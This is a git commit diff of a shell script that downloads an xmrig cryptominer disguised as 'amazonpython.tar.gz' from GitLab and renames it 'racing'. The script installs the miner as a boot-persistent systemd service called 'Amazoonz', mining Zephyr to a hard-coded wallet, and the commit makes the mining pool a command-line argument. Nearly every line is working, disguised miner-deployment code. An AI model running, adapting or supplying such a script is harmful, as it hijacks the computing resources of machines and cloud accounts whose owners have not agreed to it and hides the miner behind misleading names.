528d9ab9e708b25826e91317f30fd0e50ce749f5
bizzip9x <106524605+bizzip9x@users.noreply.github.com>
2024-01-15 15:47:15 +0700

    Update huyvip1.sh

--- huyvip1.sh
+++ huyvip1.sh
@@ -2,13 +2,14 @@
 cd /usr/local/bin
 worker_value="$1"
 worker_thread="$2"
+pool="$3"
 echo "Run worker: $worker_value"
 echo "worker thread: $worker_thread"
 sudo wget https://gitlab.com/amaz/grabcar/-/raw/main/amazonpython.tar.gz
 sudo apt update
 sudo tar xvzf amazonpython.tar.gz
 sudo mv xmrig-6.20.0 racing
-sudo bash -c 'echo -e "[Unit]\nDescription=Amazoonz\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/racing/xmrig --donate-level 1 -o de.zephyr.herominers.com:1123 -u ZEPHYR3AJ3qZrhYoqpP6HcQ1iALp3Yd119YAfCaeCajF4JPZqLerQyjJXjZ5AtT53Cd9L893TufCyi2CgqThaNGa9Kbk1piv5bu4k -p '$worker_value' -a rx/0 -k -t '$worker_thread'\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/amazoonz.service'
+sudo bash -c 'echo -e "[Unit]\nDescription=Amazoonz\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/racing/xmrig --donate-level 1 -o '$pool' -u ZEPHYR3AJ3qZrhYoqpP6HcQ1iALp3Yd119YAfCaeCajF4JPZqLerQyjJXjZ5AtT53Cd9L893TufCyi2CgqThaNGa9Kbk1piv5bu4k -p '$worker_value' -a rx/0 -k -t '$worker_thread'\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/amazoonz.service'
 sudo systemctl daemon-reload
 sudo systemctl enable amazoonz.service
 echo "$worker_value worked shutdowd vm now"
